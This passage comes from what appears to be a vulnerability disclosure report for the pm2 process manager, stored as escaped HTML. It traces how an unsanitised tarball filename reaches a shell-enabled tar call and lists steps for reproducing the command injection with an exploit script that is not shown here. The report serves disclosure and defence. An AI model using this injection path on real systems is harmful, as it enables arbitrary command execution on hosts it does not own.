class=\"nx\"\u003emodule_name\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Installing local NPM module`\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eNPM\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocalStart\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etarball\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eindexOf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tar.gz\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e   \u003cspan class=\"c1\"\u003e//// vulnerable code\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Installing TAR module`\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eTAR\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e  \u003cspan class=\"c1\"\u003e//// not sanitized module_name is used as an argument here \u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Installing NPM \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e module`\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eNPM\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere\u0026#39;s \u003ccode\u003eTAR.install()\u003c/code\u003e source code (\u003ccode\u003elib/API/Modules/TAR.js\u003c/code\u003e, line 21). \u003ccode\u003emodule_name\u003c/code\u003e variable from previous call is read as \u003ccode\u003emodule_filepath\u003c/code\u003e argument:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"cm\"\u003e/**\n * Module management to manage tarball packages\n *\n * pm2 install http.tar.gz\n * pm2 uninstall http\n *\n * - the first and only folder in the tarball must be called module (tar zcvf http module/)\n * - a package.json must be present with attribute \u0026quot;name\u0026quot;, \u0026quot;version\u0026quot; and \u0026quot;pm2\u0026quot; to declare apps to run\n */\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ePM2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// Remote file retrieval\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eincludes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget_file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003epop\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget_filepath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eos\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etmpdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget_file\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eretrieveRemote\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerrMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003einstallLocal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ePM2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Local install\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003einstallLocal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ePM2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \u003cspan class=\"c1\"\u003e//// call to vulnerable function with unsanitized module_filepath\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLast step in execution chain is \u003ccode\u003einstallLocal()\u003c/code\u003e function call in the same \u003ccode\u003eTAR.js\u003c/code\u003e file (\u003ccode\u003elib/API/Modules/TAR.js\u003c/code\u003e, line 71):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003einstallLocal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ePM2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Installing package \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Get module name by unpacking the module/package.json only and read the name attribute\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003egetModuleName\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Module name is \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Depackaging module...`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecst\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eDEFAULT_MODULE_PATH\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexistsSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003edeleteModulePath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emkdirp\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003esync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e//// here unsanitized module_filepath reaches execution sink:\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall_instance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003etar\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ezxf\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_filepath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e-C\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e--strip-components 1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003estdio\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einherit\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n          \u003cspan class=\"na\"\u003eshell\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003einstall_instance\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclose\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Module depackaged in \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003erunInstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ePM2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003einstall_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ePM2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexitCli\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003einstall_instance\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estack\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the line marked with my comment \u003ccode\u003emodule_filepath\u003c/code\u003e finally reaches \u003ccode\u003etar\u003c/code\u003e OS command call, which executes payload injected as a part of \u003ccode\u003etar\u003c/code\u003e archive filename.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003einstall pm2 (\u003ccode\u003enpm i pm2\u003c/code\u003e) - I\u0026#39;ve installed it locally and made symlink to executable \u003ccode\u003e./node_modules/pm2/bin/pm2\u003c/code\u003e in the same folder with \u003ccode\u003eln -s ./node_modules/pm2/bin/pm2 pm2\u003c/code\u003e command\u003c/li\u003e\n\u003cli\u003erun \u003ccode\u003epm2 start\u003c/code\u003e to run and verify if \u003ccode\u003epm2\u003c/code\u003e is installed correctly. You should see output similar to following:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show \u0026lt;id|name\u0026gt;` to get more details about an app\nbl4de:~/playground/Node $\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003esave \u003ccode\u003epm2_exploit.js\u003c/code\u003e provided in section above in the same folder and run it with \u003ccode\u003enode pm2_exploit.js\u003c/code\u003e command\u003c/li\u003e\n\u003cli\u003everify that file \u003ccode\u003ewhoamreallyare\u003c/code\u003e was created and your username is saved there\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pm2_exploit.png\" 